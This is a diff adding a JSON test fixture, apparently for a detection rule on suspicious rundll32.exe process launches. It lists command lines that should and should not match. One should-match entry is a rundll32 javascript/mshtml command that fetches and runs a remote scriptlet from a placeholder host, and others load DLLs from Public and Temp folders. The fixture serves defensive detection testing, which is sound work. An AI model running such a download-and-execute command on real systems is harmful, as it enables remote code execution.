@@ -1,0 +1,26 @@
+{
+  "should_match": [
+    {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://evil.example/x.sct\")"
+    },
+    {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe C:\\Users\\Public\\update.dll,DllRegisterServer"
+    },
+    {
+      "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+      "CommandLine": "rundll32.exe C:\\Users\\user\\AppData\\Local\\Temp\\a.dll,Start"
+    }
+  ],
+  "should_not_match": [
+    {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"
+    },
+    {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\ext.dll,Init"
+    }
+  ]
+}
